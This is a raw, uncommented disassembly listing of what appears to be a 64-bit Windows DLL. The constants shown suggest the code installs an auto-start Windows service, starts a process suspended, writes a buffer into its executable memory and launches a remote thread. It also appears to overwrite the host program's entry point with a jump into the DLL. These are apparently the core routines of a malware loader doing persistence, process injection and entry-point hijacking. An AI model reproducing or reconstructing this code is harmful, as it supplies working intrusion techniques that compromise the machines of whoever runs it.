   180001784:	ff 15 e6 29 03 00    	call   *0x329e6(%rip)        # 0x180034170
   18000178a:	48 63 c8             	movslq %eax,%rcx
   18000178d:	8b d6                	mov    %esi,%edx
   18000178f:	85 c0                	test   %eax,%eax
   180001791:	7e 1a                	jle    0x1800017ad
   180001793:	80 3c 19 5c          	cmpb   $0x5c,(%rcx,%rbx,1)
   180001797:	75 0a                	jne    0x1800017a3
   180001799:	85 d2                	test   %edx,%edx
   18000179b:	0f 84 e2 01 00 00    	je     0x180001983
   1800017a1:	ff ca                	dec    %edx
   1800017a3:	ff c8                	dec    %eax
   1800017a5:	48 ff c9             	dec    %rcx
   1800017a8:	48 85 c9             	test   %rcx,%rcx
   1800017ab:	7f e6                	jg     0x180001793
   1800017ad:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   1800017b1:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   1800017b5:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1800017b9:	75 f6                	jne    0x1800017b1
   1800017bb:	f2 0f 10 05 65 12 04 	movsd  0x41265(%rip),%xmm0        # 0x180042a28
   1800017c2:	00 
   1800017c3:	45 33 c9             	xor    %r9d,%r9d
   1800017c6:	0f b6 05 63 12 04 00 	movzbl 0x41263(%rip),%eax        # 0x180042a30
   1800017cd:	48 8b cb             	mov    %rbx,%rcx
   1800017d0:	f2 0f 11 02          	movsd  %xmm0,(%rdx)
   1800017d4:	88 42 08             	mov    %al,0x8(%rdx)
   1800017d7:	ba 00 00 00 80       	mov    $0x80000000,%edx
   1800017dc:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1800017e1:	45 8d 41 02          	lea    0x2(%r9),%r8d
   1800017e5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1800017ec:	00 
   1800017ed:	48 89 bc 24 90 10 00 	mov    %rdi,0x1090(%rsp)
   1800017f4:	00 
   1800017f5:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   1800017fc:	00 
   1800017fd:	ff 15 fd 28 03 00    	call   *0x328fd(%rip)        # 0x180034100
   180001803:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180001807:	0f 84 92 01 00 00    	je     0x18000199f
   18000180d:	48 8b c8             	mov    %rax,%rcx
   180001810:	ff 15 4a 28 03 00    	call   *0x3284a(%rip)        # 0x180034060
   180001816:	48 8d 05 43 fe ff ff 	lea    -0x1bd(%rip),%rax        # 0x180001660
   18000181d:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   180001822:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   180001829:	00 
   18000182a:	ff 15 e8 27 03 00    	call   *0x327e8(%rip)        # 0x180034018
   180001830:	48 8d 05 d1 11 04 00 	lea    0x411d1(%rip),%rax        # 0x180042a08
   180001837:	41 b8 d0 07 00 00    	mov    $0x7d0,%r8d
   18000183d:	48 8d 94 24 a0 08 00 	lea    0x8a0(%rsp),%rdx
   180001844:	00 
   180001845:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   18000184a:	33 c9                	xor    %ecx,%ecx
   18000184c:	ff 15 1e 29 03 00    	call   *0x3291e(%rip)        # 0x180034170
   180001852:	33 d2                	xor    %edx,%edx
   180001854:	33 c9                	xor    %ecx,%ecx
   180001856:	41 b8 3f 00 0f 00    	mov    $0xf003f,%r8d
   18000185c:	ff 15 d6 27 03 00    	call   *0x327d6(%rip)        # 0x180034038
   180001862:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
   180001869:	00 
   18000186a:	48 8b f8             	mov    %rax,%rdi
   18000186d:	48 ff ca             	dec    %rdx
   180001870:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   180001874:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001878:	75 f6                	jne    0x180001870
   18000187a:	0f b7 0d b3 11 04 00 	movzwl 0x411b3(%rip),%ecx        # 0x180042a34
   180001881:	66 89 0a             	mov    %cx,(%rdx)
   180001884:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
   18000188b:	00 
   18000188c:	48 ff ca             	dec    %rdx
   18000188f:	90                   	nop
   180001890:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   180001894:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001898:	75 f6                	jne    0x180001890
   18000189a:	4c 8d 8c 24 a0 08 00 	lea    0x8a0(%rsp),%r9
   1800018a1:	00 
   1800018a2:	45 33 c0             	xor    %r8d,%r8d
   1800018a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800018ac:	00 00 00 00 
   1800018b0:	43 0f b6 04 01       	movzbl (%r9,%r8,1),%eax
   1800018b5:	42 88 04 02          	mov    %al,(%rdx,%r8,1)
   1800018b9:	4d 8d 40 01          	lea    0x1(%r8),%r8
   1800018bd:	84 c0                	test   %al,%al
   1800018bf:	75 ef                	jne    0x1800018b0
   1800018c1:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   1800018c8:	00 
   1800018c9:	48 ff c8             	dec    %rax
   1800018cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800018d0:	40 38 70 01          	cmp    %sil,0x1(%rax)
   1800018d4:	48 8d 40 01          	lea    0x1(%rax),%rax
   1800018d8:	75 f6                	jne    0x1800018d0
   1800018da:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   1800018df:	4c 8d 05 ca 10 04 00 	lea    0x410ca(%rip),%r8        # 0x1800429b0
   1800018e6:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   1800018eb:	41 b9 ff 01 0f 00    	mov    $0xf01ff,%r9d
   1800018f1:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1800018f6:	48 8b d5             	mov    %rbp,%rdx
   1800018f9:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   1800018fe:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180001903:	66 89 08             	mov    %cx,(%rax)
   180001906:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   18000190d:	00 
   18000190e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180001913:	48 8b cf             	mov    %rdi,%rcx
   180001916:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   18000191d:	00 
   18000191e:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   180001925:	00 
   180001926:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   18000192d:	00 
   18000192e:	ff 15 dc 26 03 00    	call   *0x326dc(%rip)        # 0x180034010
   180001934:	48 8b d8             	mov    %rax,%rbx
   180001937:	48 85 c0             	test   %rax,%rax
   18000193a:	74 63                	je     0x18000199f
   18000193c:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180001941:	ba 01 00 00 00       	mov    $0x1,%edx
   180001946:	48 8b c8             	mov    %rax,%rcx
   180001949:	ff 15 d9 26 03 00    	call   *0x326d9(%rip)        # 0x180034028
   18000194f:	45 33 c0             	xor    %r8d,%r8d
   180001952:	33 d2                	xor    %edx,%edx
   180001954:	48 8b cb             	mov    %rbx,%rcx
   180001957:	ff 15 ab 26 03 00    	call   *0x326ab(%rip)        # 0x180034008
   18000195d:	48 8b cb             	mov    %rbx,%rcx
   180001960:	ff 15 ba 26 03 00    	call   *0x326ba(%rip)        # 0x180034020
   180001966:	48 8b cf             	mov    %rdi,%rcx
   180001969:	ff 15 b1 26 03 00    	call   *0x326b1(%rip)        # 0x180034020
   18000196f:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   180001974:	ff 15 8e 27 03 00    	call   *0x3278e(%rip)        # 0x180034108
   18000197a:	33 c9                	xor    %ecx,%ecx
   18000197c:	ff 15 16 27 03 00    	call   *0x32716(%rip)        # 0x180034098
   180001982:	cc                   	int3
   180001983:	48 98                	cltq
   180001985:	48 ff c0             	inc    %rax
   180001988:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   18000198e:	73 09                	jae    0x180001999
   180001990:	40 88 34 18          	mov    %sil,(%rax,%rbx,1)
   180001994:	e9 14 fe ff ff       	jmp    0x1800017ad
   180001999:	e8 5a ad 00 00       	call   0x18000c6f8
   18000199e:	cc                   	int3
   18000199f:	33 c9                	xor    %ecx,%ecx
   1800019a1:	ff 15 f1 26 03 00    	call   *0x326f1(%rip)        # 0x180034098
   1800019a7:	cc                   	int3
   1800019a8:	cc                   	int3
   1800019a9:	cc                   	int3
   1800019aa:	cc                   	int3
   1800019ab:	cc                   	int3
   1800019ac:	cc                   	int3
   1800019ad:	cc                   	int3
   1800019ae:	cc                   	int3
   1800019af:	cc                   	int3
   1800019b0:	48 83 ec 38          	sub    $0x38,%rsp
   1800019b4:	45 33 c9             	xor    %r9d,%r9d
   1800019b7:	45 33 c0             	xor    %r8d,%r8d
   1800019ba:	33 d2                	xor    %edx,%edx
   1800019bc:	33 c9                	xor    %ecx,%ecx
   1800019be:	ff 15 a4 27 03 00    	call   *0x327a4(%rip)        # 0x180034168
   1800019c4:	48 89 05 5d a6 04 00 	mov    %rax,0x4a65d(%rip)        # 0x18004c028
   1800019cb:	45 33 c9             	xor    %r9d,%r9d
   1800019ce:	33 c0                	xor    %eax,%eax
   1800019d0:	4c 8d 05 79 f7 ff ff 	lea    -0x887(%rip),%r8        # 0x180001150
   1800019d7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800019dc:	33 d2                	xor    %edx,%edx
   1800019de:	33 c9                	xor    %ecx,%ecx
   1800019e0:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800019e4:	ff 15 7e 26 03 00    	call   *0x3267e(%rip)        # 0x180034068
   1800019ea:	48 8b c8             	mov    %rax,%rcx
   1800019ed:	48 89 05 1c a2 04 00 	mov    %rax,0x4a21c(%rip)        # 0x18004bc10
   1800019f4:	ff 15 66 26 03 00    	call   *0x32666(%rip)        # 0x180034060
   1800019fa:	48 8b 0d 27 a6 04 00 	mov    0x4a627(%rip),%rcx        # 0x18004c028
   180001a01:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180001a06:	ff 15 1c 27 03 00    	call   *0x3271c(%rip)        # 0x180034128
   180001a0c:	33 c9                	xor    %ecx,%ecx
   180001a0e:	e8 dd 20 01 00       	call   0x180013af0
   180001a13:	cc                   	int3
   180001a14:	cc                   	int3
   180001a15:	cc                   	int3
   180001a16:	cc                   	int3
   180001a17:	cc                   	int3
   180001a18:	cc                   	int3
   180001a19:	cc                   	int3
   180001a1a:	cc                   	int3
   180001a1b:	cc                   	int3
   180001a1c:	cc                   	int3
   180001a1d:	cc                   	int3
   180001a1e:	cc                   	int3
   180001a1f:	cc                   	int3
   180001a20:	4c 8b dc             	mov    %rsp,%r11
   180001a23:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   180001a27:	49 89 73 20          	mov    %rsi,0x20(%r11)
   180001a2b:	57                   	push   %rdi
   180001a2c:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   180001a33:	48 8b 05 d6 75 04 00 	mov    0x475d6(%rip),%rax        # 0x180049010
   180001a3a:	48 33 c4             	xor    %rsp,%rax
   180001a3d:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
   180001a44:	00 
   180001a45:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001a48:	48 8b d9             	mov    %rcx,%rbx
   180001a4b:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   180001a50:	33 f6                	xor    %esi,%esi
   180001a52:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180001a57:	0f 11 84 24 84 00 00 	movups %xmm0,0x84(%rsp)
   180001a5e:	00 
   180001a5f:	48 8b fa             	mov    %rdx,%rdi
   180001a62:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   180001a67:	0f 11 84 24 94 00 00 	movups %xmm0,0x94(%rsp)
   180001a6e:	00 
   180001a6f:	0f 11 84 24 a4 00 00 	movups %xmm0,0xa4(%rsp)
   180001a76:	00 
   180001a77:	41 0f 11 43 8c       	movups %xmm0,-0x74(%r11)
   180001a7c:	41 0f 11 43 9c       	movups %xmm0,-0x64(%r11)
   180001a81:	41 0f 11 43 ac       	movups %xmm0,-0x54(%r11)
   180001a86:	41 0f 11 43 bc       	movups %xmm0,-0x44(%r11)
   180001a8b:	41 0f 11 43 cc       	movups %xmm0,-0x34(%r11)
   180001a90:	c7 44 24 70 94 00 00 	movl   $0x94,0x70(%rsp)
   180001a97:	00 
   180001a98:	ff 15 ba 25 03 00    	call   *0x325ba(%rip)        # 0x180034058
   180001a9e:	83 7c 24 74 06       	cmpl   $0x6,0x74(%rsp)
   180001aa3:	72 5d                	jb     0x180001b02
   180001aa5:	48 8d 0d a4 0f 04 00 	lea    0x40fa4(%rip),%rcx        # 0x180042a50
   180001aac:	ff 15 66 26 03 00    	call   *0x32666(%rip)        # 0x180034118
   180001ab2:	48 8b c8             	mov    %rax,%rcx
   180001ab5:	48 8d 15 7c 0f 04 00 	lea    0x40f7c(%rip),%rdx        # 0x180042a38
   180001abc:	ff 15 b6 25 03 00    	call   *0x325b6(%rip)        # 0x180034078
   180001ac2:	48 85 c0             	test   %rax,%rax
   180001ac5:	74 5f                	je     0x180001b26
   180001ac7:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   180001acc:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180001ad1:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180001ad6:	4c 8b cb             	mov    %rbx,%r9
   180001ad9:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180001ade:	45 33 c0             	xor    %r8d,%r8d
   180001ae1:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180001ae6:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180001aeb:	89 74 24 30          	mov    %esi,0x30(%rsp)
   180001aef:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180001af4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180001af9:	ff d0                	call   *%rax
   180001afb:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180001b00:	eb 1f                	jmp    0x180001b21
   180001b02:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180001b07:	4c 8b cf             	mov    %rdi,%r9
   180001b0a:	89 74 24 28          	mov    %esi,0x28(%rsp)
   180001b0e:	45 33 c0             	xor    %r8d,%r8d
   180001b11:	33 d2                	xor    %edx,%edx
   180001b13:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001b18:	48 8b cb             	mov    %rbx,%rcx
   180001b1b:	ff 15 87 25 03 00    	call   *0x32587(%rip)        # 0x1800340a8
   180001b21:	48 85 c0             	test   %rax,%rax
   180001b24:	75 02                	jne    0x180001b28
   180001b26:	33 c0                	xor    %eax,%eax
   180001b28:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   180001b2f:	00 
   180001b30:	48 33 cc             	xor    %rsp,%rcx
   180001b33:	e8 98 aa 00 00       	call   0x18000c5d0
   180001b38:	4c 8d 9c 24 20 01 00 	lea    0x120(%rsp),%r11
   180001b3f:	00 
   180001b40:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180001b44:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180001b48:	49 8b e3             	mov    %r11,%rsp
   180001b4b:	5f                   	pop    %rdi
   180001b4c:	c3                   	ret
   180001b4d:	cc                   	int3
   180001b4e:	cc                   	int3
   180001b4f:	cc                   	int3
   180001b50:	4c 8b dc             	mov    %rsp,%r11
   180001b53:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   180001b57:	49 89 73 18          	mov    %rsi,0x18(%r11)
   180001b5b:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   180001b5f:	41 54                	push   %r12
   180001b61:	41 56                	push   %r14
   180001b63:	41 57                	push   %r15
   180001b65:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   180001b6c:	48 8b 05 9d 74 04 00 	mov    0x4749d(%rip),%rax        # 0x180049010
   180001b73:	48 33 c4             	xor    %rsp,%rax
   180001b76:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   180001b7d:	00 
   180001b7e:	44 8b 35 87 a0 04 00 	mov    0x4a087(%rip),%r14d        # 0x18004bc0c
   180001b85:	4c 8b 25 8c a0 04 00 	mov    0x4a08c(%rip),%r12        # 0x18004bc18
   180001b8c:	33 f6                	xor    %esi,%esi
   180001b8e:	8b de                	mov    %esi,%ebx
   180001b90:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   180001b95:	8b fe                	mov    %esi,%edi
   180001b97:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   180001b9c:	c7 84 24 80 00 00 00 	movl   $0x68,0x80(%rsp)
   180001ba3:	68 00 00 00 
   180001ba7:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001baa:	0f 11 84 24 88 00 00 	movups %xmm0,0x88(%rsp)
   180001bb1:	00 
   180001bb2:	41 0f 11 43 80       	movups %xmm0,-0x80(%r11)
   180001bb7:	41 0f 11 43 90       	movups %xmm0,-0x70(%r11)
   180001bbc:	41 0f 11 43 a0       	movups %xmm0,-0x60(%r11)
   180001bc1:	41 0f 11 43 b0       	movups %xmm0,-0x50(%r11)
   180001bc6:	41 0f 11 43 c0       	movups %xmm0,-0x40(%r11)
   180001bcb:	33 c0                	xor    %eax,%eax
   180001bcd:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   180001bd4:	00 
   180001bd5:	0f 11 84 24 90 00 00 	movups %xmm0,0x90(%rsp)
   180001bdc:	00 
   180001bdd:	41 0f 11 43 88       	movups %xmm0,-0x78(%r11)
   180001be2:	41 0f 11 43 98       	movups %xmm0,-0x68(%r11)
   180001be7:	41 0f 11 43 a8       	movups %xmm0,-0x58(%r11)
   180001bec:	41 0f 11 43 b8       	movups %xmm0,-0x48(%r11)
   180001bf1:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   180001bf5:	c7 84 24 80 00 00 00 	movl   $0x68,0x80(%rsp)
   180001bfc:	68 00 00 00 
   180001c00:	41 c7 43 a4 01 00 00 	movl   $0x1,-0x5c(%r11)
   180001c07:	00 
   180001c08:	66 41 89 73 a8       	mov    %si,-0x58(%r11)
   180001c0d:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180001c12:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001c17:	49 8d 83 68 ff ff ff 	lea    -0x98(%r11),%rax
   180001c1e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180001c23:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180001c28:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180001c2d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180001c34:	00 
   180001c35:	89 74 24 20          	mov    %esi,0x20(%rsp)
   180001c39:	45 33 c9             	xor    %r9d,%r9d
   180001c3c:	45 33 c0             	xor    %r8d,%r8d
   180001c3f:	48 8b d1             	mov    %rcx,%rdx
   180001c42:	33 c9                	xor    %ecx,%ecx
   180001c44:	ff 15 66 24 03 00    	call   *0x32466(%rip)        # 0x1800340b0
   180001c4a:	85 c0                	test   %eax,%eax
   180001c4c:	0f 84 8b 00 00 00    	je     0x180001cdd
   180001c52:	44 8b 44 24 70       	mov    0x70(%rsp),%r8d
   180001c57:	8d 56 01             	lea    0x1(%rsi),%edx
   180001c5a:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   180001c5f:	ff 15 ab 24 03 00    	call   *0x324ab(%rip)        # 0x180034110
   180001c65:	48 8b d8             	mov    %rax,%rbx
   180001c68:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180001c6d:	45 8b fe             	mov    %r14d,%r15d
   180001c70:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   180001c77:	00 
   180001c78:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   180001c7e:	45 8b c6             	mov    %r14d,%r8d
   180001c81:	33 d2                	xor    %edx,%edx
   180001c83:	48 8b c8             	mov    %rax,%rcx
   180001c86:	ff 15 f4 23 03 00    	call   *0x323f4(%rip)        # 0x180034080
   180001c8c:	4c 8b f0             	mov    %rax,%r14
   180001c8f:	48 85 c0             	test   %rax,%rax
   180001c92:	74 4e                	je     0x180001ce2
   180001c94:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001c99:	45 8b cf             	mov    %r15d,%r9d
   180001c9c:	4d 8b c4             	mov    %r12,%r8
   180001c9f:	48 8b d0             	mov    %rax,%rdx
   180001ca2:	48 8b cb             	mov    %rbx,%rcx
   180001ca5:	ff 15 8d 24 03 00    	call   *0x3248d(%rip)        # 0x180034138
   180001cab:	85 c0                	test   %eax,%eax
   180001cad:	74 33                	je     0x180001ce2
   180001caf:	49 8b d6             	mov    %r14,%rdx
   180001cb2:	48 8b cb             	mov    %rbx,%rcx
   180001cb5:	e8 66 fd ff ff       	call   0x180001a20
   180001cba:	48 8b f8             	mov    %rax,%rdi
   180001cbd:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180001cc2:	48 85 c0             	test   %rax,%rax
   180001cc5:	74 1b                	je     0x180001ce2
   180001cc7:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180001ccc:	ff 15 8e 23 03 00    	call   *0x3238e(%rip)        # 0x180034060
   180001cd2:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180001cd7:	ff 15 83 23 03 00    	call   *0x32383(%rip)        # 0x180034060
   180001cdd:	be 01 00 00 00       	mov    $0x1,%esi
   180001ce2:	48 85 ff             	test   %rdi,%rdi
   180001ce5:	74 09                	je     0x180001cf0
   180001ce7:	48 8b cf             	mov    %rdi,%rcx
   180001cea:	ff 15 70 23 03 00    	call   *0x32370(%rip)        # 0x180034060
   180001cf0:	48 85 db             	test   %rbx,%rbx
   180001cf3:	74 09                	je     0x180001cfe
   180001cf5:	48 8b cb             	mov    %rbx,%rcx
   180001cf8:	ff 15 62 23 03 00    	call   *0x32362(%rip)        # 0x180034060
   180001cfe:	8b c6                	mov    %esi,%eax
   180001d00:	48 8b 8c 24 f0 00 00 	mov    0xf0(%rsp),%rcx
   180001d07:	00 
   180001d08:	48 33 cc             	xor    %rsp,%rcx
   180001d0b:	e8 c0 a8 00 00       	call   0x18000c5d0
   180001d10:	4c 8d 9c 24 00 01 00 	lea    0x100(%rsp),%r11
   180001d17:	00 
   180001d18:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180001d1c:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180001d20:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   180001d24:	49 8b e3             	mov    %r11,%rsp
   180001d27:	41 5f                	pop    %r15
   180001d29:	41 5e                	pop    %r14
   180001d2b:	41 5c                	pop    %r12
   180001d2d:	c3                   	ret
   180001d2e:	cc                   	int3
   180001d2f:	cc                   	int3
   180001d30:	48 83 ec 68          	sub    $0x68,%rsp
   180001d34:	48 8b 05 d5 72 04 00 	mov    0x472d5(%rip),%rax        # 0x180049010
   180001d3b:	48 33 c4             	xor    %rsp,%rax
   180001d3e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180001d43:	83 fa 01             	cmp    $0x1,%edx
   180001d46:	0f 85 d3 00 00 00    	jne    0x180001e1f
   180001d4c:	33 c9                	xor    %ecx,%ecx
   180001d4e:	ff 15 c4 23 03 00    	call   *0x323c4(%rip)        # 0x180034118
   180001d54:	48 8b c8             	mov    %rax,%rcx
   180001d57:	48 85 c0             	test   %rax,%rax
   180001d5a:	0f 84 bf 00 00 00    	je     0x180001e1f
   180001d60:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001d65:	66 39 01             	cmp    %ax,(%rcx)
   180001d68:	0f 85 b1 00 00 00    	jne    0x180001e1f
   180001d6e:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   180001d72:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   180001d79:	0f 85 a0 00 00 00    	jne    0x180001e1f
   180001d7f:	8b 54 08 28          	mov    0x28(%rax,%rcx,1),%edx
   180001d83:	85 d2                	test   %edx,%edx
   180001d85:	0f 84 94 00 00 00    	je     0x180001e1f
   180001d8b:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   180001d90:	8b da                	mov    %edx,%ebx
   180001d92:	48 03 d9             	add    %rcx,%rbx
   180001d95:	74 6c                	je     0x180001e03
   180001d97:	f2 0f 10 05 c1 0c 04 	movsd  0x40cc1(%rip),%xmm0        # 0x180042a60
   180001d9e:	00 
   180001d9f:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001da4:	8b 05 be 0c 04 00    	mov    0x40cbe(%rip),%eax        # 0x180042a68
   180001daa:	ba 0c 00 00 00       	mov    $0xc,%edx
   180001daf:	48 8b cb             	mov    %rbx,%rcx
   180001db2:	f2 0f 11 44 24 35    	movsd  %xmm0,0x35(%rsp)
   180001db8:	89 44 24 3d          	mov    %eax,0x3d(%rsp)
   180001dbc:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   180001dc3:	00 
   180001dc4:	44 8d 42 34          	lea    0x34(%rdx),%r8d
   180001dc8:	ff 15 62 23 03 00    	call   *0x32362(%rip)        # 0x180034130
   180001dce:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   180001dd3:	48 8d 05 26 f9 ff ff 	lea    -0x6da(%rip),%rax        # 0x180001700
   180001dda:	48 89 44 24 37       	mov    %rax,0x37(%rsp)
   180001ddf:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001de4:	f2 0f 10 44 24 35    	movsd  0x35(%rsp),%xmm0
   180001dea:	ba 0c 00 00 00       	mov    $0xc,%edx
   180001def:	8b 44 24 3d          	mov    0x3d(%rsp),%eax
   180001df3:	48 8b cb             	mov    %rbx,%rcx
   180001df6:	f2 0f 11 03          	movsd  %xmm0,(%rbx)
   180001dfa:	89 43 08             	mov    %eax,0x8(%rbx)
   180001dfd:	ff 15 2d 23 03 00    	call   *0x3232d(%rip)        # 0x180034130
   180001e03:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180001e08:	b8 01 00 00 00       	mov    $0x1,%eax
   180001e0d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180001e12:	48 33 cc             	xor    %rsp,%rcx
   180001e15:	e8 b6 a7 00 00       	call   0x18000c5d0
   180001e1a:	48 83 c4 68          	add    $0x68,%rsp
   180001e1e:	c3                   	ret
   180001e1f:	b8 01 00 00 00       	mov    $0x1,%eax
   180001e24:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180001e29:	48 33 cc             	xor    %rsp,%rcx
   180001e2c:	e8 9f a7 00 00       	call   0x18000c5d0
   180001e31:	48 83 c4 68          	add    $0x68,%rsp
   180001e35:	c3                   	ret
   180001e36:	cc                   	int3
   180001e37:	cc                   	int3
   180001e38:	cc                   	int3
   180001e39:	cc                   	int3
   180001e3a:	cc                   	int3
   180001e3b:	cc                   	int3
   180001e3c:	cc                   	int3
   180001e3d:	cc                   	int3
   180001e3e:	cc                   	int3
   180001e3f:	cc                   	int3
   180001e40:	48 8d 05 41 a2 04 00 	lea    0x4a241(%rip),%rax        # 0x18004c088
   180001e47:	c3                   	ret
   180001e48:	cc                   	int3
   180001e49:	cc                   	int3
   180001e4a:	cc                   	int3
   180001e4b:	cc                   	int3
   180001e4c:	cc                   	int3
   180001e4d:	cc                   	int3
   180001e4e:	cc                   	int3
   180001e4f:	cc                   	int3
   180001e50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001e55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001e5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180001e5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180001e64:	53                   	push   %rbx
   180001e65:	56                   	push   %rsi
   180001e66:	57                   	push   %rdi
   180001e67:	48 83 ec 30          	sub    $0x30,%rsp
   180001e6b:	48 8b f9             	mov    %rcx,%rdi
   180001e6e:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   180001e73:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001e78:	e8 db 1e 01 00       	call   0x180013d58
   180001e7d:	48 8b d8             	mov    %rax,%rbx
   180001e80:	e8 bb ff ff ff       	call   0x180001e40
   180001e85:	45 33 c9             	xor    %r9d,%r9d
   180001e88:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001e8d:	4c 8b c7             	mov    %rdi,%r8
   180001e90:	48 8b d3             	mov    %rbx,%rdx
   180001e93:	48 8b 08             	mov    (%rax),%rcx
   180001e96:	e8 6d 7b 01 00       	call   0x180019a08
   180001e9b:	48 83 c4 30          	add    $0x30,%rsp
   180001e9f:	5f                   	pop    %rdi
   180001ea0:	5e                   	pop    %rsi
   180001ea1:	5b                   	pop    %rbx
   180001ea2:	c3                   	ret
   180001ea3:	cc                   	int3
   180001ea4:	cc                   	int3
   180001ea5:	cc                   	int3
   180001ea6:	cc                   	int3
   180001ea7:	cc                   	int3
   180001ea8:	cc                   	int3
   180001ea9:	cc                   	int3
   180001eaa:	cc                   	int3
   180001eab:	cc                   	int3
   180001eac:	cc                   	int3
   180001ead:	cc                   	int3
   180001eae:	cc                   	int3
   180001eaf:	cc                   	int3
   180001eb0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180001eb5:	53                   	push   %rbx
   180001eb6:	55                   	push   %rbp
   180001eb7:	56                   	push   %rsi
   180001eb8:	57                   	push   %rdi
   180001eb9:	41 56                	push   %r14
   180001ebb:	48 83 ec 40          	sub    $0x40,%rsp
